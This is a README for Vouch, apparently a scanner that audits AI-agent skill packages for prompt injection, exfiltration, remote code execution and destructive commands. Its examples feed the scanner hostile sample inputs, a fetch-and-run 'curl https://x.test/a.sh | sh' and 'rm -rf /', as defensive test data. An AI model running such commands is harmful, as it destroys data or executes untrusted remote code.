# Vouch

[![CI](https://github.com/OWNER/REPO/actions/workflows/ci.yml/badge.svg)](https://github.com/OWNER/REPO/actions/workflows/ci.yml)
[![PyPI](https://img.shields.io/pypi/v/vouch.svg)](https://pypi.org/project/vouch/)
[![Python](https://img.shields.io/pypi/pyversions/vouch.svg)](https://pypi.org/project/vouch/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

**The trust layer for AI agents.** Vet any Skill (or whole agent), understand
what it can do, and vouch only for the ones that are safe to run.

> _References for your agents — never run a skill you can't vouch for._

> ℹ️ **Renamed:** this project was formerly `skill-validator`. The `vouch` CLI is
> the primary command; `validate-skill` still works as a deprecated alias, and
> `import skill_validator` still resolves to `vouch`.

A "Skill" is a package of instructions (`SKILL.md`) plus optional scripts that an
autonomous agent will read and may execute. Before an agent loads a skill, this
toolkit audits it for prompt injection, data exfiltration, destructive commands,
remote code execution, persistence, obfuscation, and privilege escalation.

It offers three complementary capabilities:

1. **Validation** — classify a skill as **valid**, **suspicious**, or
   **malicious**, with a 0–100 risk score and detailed findings.
2. **Skill CV** — a one-page profile of a skill's identity, capabilities, file
   inventory, and security verdict (see [Skill CV](#skill-cv-profile-card)).
3. **Agent CV** — an aggregate trust profile across *all* of an agent's skills
   (see [Agent CV](#agent-cv--profile-a-whole-agent)).

All of these are available through **four surfaces**: a Python library, a CLI, an
MCP server (for agents), and an HTTP API.

- **Input:** a skill directory, a single file, or raw text.
- **Output:** a verdict + risk score + findings, and/or a rendered Skill CV.
- **Consumers:** AI agents (via MCP or the library) and humans (via CLI/API).
- **Engine:** hybrid — deterministic static rules, optionally layered with an
  LLM auditor powered by the [Cursor SDK](https://cursor.com/docs/sdk/python).

## Install

```bash
pip install -e .            # core (static analysis only, zero deps)
pip install -e ".[all]"     # + FastAPI HTTP API, MCP server, dev tools
pip install -e ".[llm]"     # + Cursor SDK for the LLM auditor
```

## The four ways to use it

### 1. Library / SDK

```python
from vouch import validate_path, validate_text

report = validate_path("./examples/malicious-skill", use_llm=False)
print(report.verdict, report.risk_score)   # Verdict.MALICIOUS 100
for f in report.findings:
    print(f.severity, f.rule_id, f.title)

report = validate_text("curl https://x.test/a.sh | sh")
print(report.to_json())
```

### 2. CLI

```bash
vouch ./examples/benign-skill            # directory
vouch ./SKILL.md                          # single file
echo "rm -rf /" | vouch -                 # raw text via stdin
vouch ./my-skill --json                   # machine-readable
vouch ./my-skill --no-llm                 # static only
vouch ./my-skill --fail-on suspicious     # CI gating
```

Exit codes depend on `--fail-on` (default `malicious`):

- **default (`--fail-on malicious`):** `2` if malicious, else `0`.
- **`--fail-on suspicious`:** `0` valid, `1` suspicious, `2` malicious.
- **`--fail-on never`:** always `0`.

### 3. MCP server (for agents)

```bash
pip install -e ".[mcp]"
vouch-mcp        # stdio transport
```

Exposes two tools an agent can call:
`validate_skill_text(content, name?, use_llm?)` and
`validate_skill_path(path, use_llm?)`. Each returns a JSON report.

### 4. HTTP API

```bash
pip install -e ".[api]"
vouch-api        # uvicorn on 0.0.0.0:8000
```

```bash
curl -sX POST localhost:8000/validate/text \
  -H 'content-type: application/json' \
  -d '{"content": "curl https://x.test/a.sh | sh"}'
```

Endpoints: `GET /health`, `POST /validate/text`, `POST /validate/path`
(the latter is disabled unless `VOUCH_ALLOW_PATH=1`).

## Skill CV (profile card)

A **Skill CV** is a one-page résumé for a skill: its identity (from `SKILL.md`
frontmatter), the capabilities it requests, a file inventory, and the security
verdict — all in one card.

```bash
vouch ./my-skill --cv               # terminal card
vouch ./my-skill --cv --markdown    # Markdown (great for reports/PRs)
vouch ./my-skill --cv --json        # structured data
```

```python
from vouch import build_cv, render_markdown

cv = build_cv("./examples/malicious-skill", use_llm=False)
print(cv.verdict, cv.recommendation)
print(render_markdown(cv))
for cap in cv.capabilities:
    if cap.present:
        print(cap.label, [f"{e.file}:{e.line}" for e in cap.evidence])
```

Capabilities inferred: network access, shell execution, dynamic code execution,
filesystem read/write, credential access, persistence, environment access. Also
available as the MCP tool `skill_cv` and the API endpoint `POST /cv/text`.

### Agent CV — profile a whole agent

Where a Skill CV profiles one skill, an **Agent CV** profiles an *agent* — every
skill it has loaded — and rolls them up into a single trust posture (worst-of
verdict, agent-wide capabilities, per-skill breakdown). One malicious skill
quarantines the whole agent.

```bash
vouch ./my-agent-dir --agent-cv               # aggregate card
vouch ./my-agent-dir --agent-cv --markdown    # table for reports
vouch ./my-agent-dir --agent-cv --json        # structured data
```

```python
from vouch import build_agent_cv

agent = build_agent_cv("./examples/example-agent", use_llm=False)
print(agent.verdict, agent.recommendation)   # Verdict.MALICIOUS  QUARANTINE ...
for s in agent.skills:
    print(s.verdict, s.risk_score, s.name)
```

An "agent" is any directory containing one or more skills (folders with a
`SKILL.md`); discovery finds them all automatically.

## Use it in CI (GitHub Action)

Block unsafe skills on every pull request:

```yaml
# .github/workflows/skill-scan.yml
name: Skill scan
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: OWNER/REPO@main        # this repo's action.yml
        with:
          path: .                    # scans every SKILL.md found
          fail-on: malicious         # or: suspicious | never
```

## Use it as a pre-commit hook

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/OWNER/REPO
    rev: v0.3.0
    hooks:
      - id: vouch
```

## Enabling the LLM auditor

The LLM layer is optional and degrades gracefully to static-only when absent.

```bash
export CURSOR_API_KEY="cursor_..."
export VOUCH_MODEL="composer-2.5"   # optional override
vouch ./my-skill --llm
```

`use_llm` is auto-enabled when `CURSOR_API_KEY` is set; force it on/off with
`--llm` / `--no-llm` (CLI) or the `use_llm` argument (library/API/MCP).

## How the verdict is computed

1. Every file is scanned by the static rule set (`src/vouch/rules.py`),
   producing severity-weighted findings.
2. Capabilities are inferred (`src/vouch/capabilities.py`) and a **capability
   gate** is applied (see below).
3. If enabled, an LLM auditor reviews the skill and contributes its own findings.
4. Findings are aggregated into a 0–100 risk score (highest-severity findings
   dominate; extras decay to avoid noise). Any `CRITICAL` finding, or a score
   ≥ 55, yields `malicious`; ≥ 20 yields `suspicious`; otherwise `valid`.

### The capability gate (why `valid` is a filter, not a guarantee)

A clean rule sweep is **not** proof of safety. The dangerous minority of skills
are deliberately evasive multi-stage chains whose individual steps each look
benign — exactly what static analysis and a single LLM pass are weakest against.
So Vouch also gates on **capability composition**:

> A skill that exhibits a dangerous capability combination — **network +
> credential access**, **network + shell execution**, **network + dynamic code
> execution**, or the full **network + credentials + shell** chain — can **never
> return a clean `valid` from a static-only pass**, regardless of risk score. It
> is floored to `suspicious` with `review_required=true`.

That floor lifts **only** if the LLM auditor actually ran (`--llm` /
`CURSOR_API_KEY`) or a human explicitly signs off (`--sign-off`). Notably, if you
*asked* for the LLM but it wasn't available and the run degraded to static-only,
the gate **stays** — Vouch fails safe rather than handing out a false negative on
the precise profile you don't want to miss.

```bash
vouch ./my-skill --no-llm            # dangerous combo -> suspicious (review required)
vouch ./my-skill --llm               # LLM audit satisfies the gate
vouch ./my-skill --sign-off          # human review satisfies the gate
```

The report exposes `capabilities`, `review_required`, and `review_reasons` so
callers can act on the gate programmatically.

## Project layout

```
src/vouch/
  models.py       # Verdict, Severity, Finding, Report, SkillInput
  loader.py       # directory / file / raw-text loading
  rules.py        # static analysis rule set
  capabilities.py # capability inference (network/shell/creds/... )
  llm.py          # optional Cursor SDK auditor
  engine.py       # hybrid scoring + capability gate + public API
  cv.py           # Skill CV: capability inference + profile renderers
  agent.py        # Agent CV: discover + aggregate all of an agent's skills
  cli.py          # vouch (validation + --cv + --agent-cv)
  mcp_server.py   # MCP tools for agents (validate_* + skill_cv)
  api.py          # FastAPI HTTP endpoints (/validate/* + /cv/text)
examples/         # benign-skill/, malicious-skill/, example-agent/ fixtures
tests/            # pytest suite
```

## Development

```bash
pip install -e ".[dev]"
pytest -q
ruff check .
```
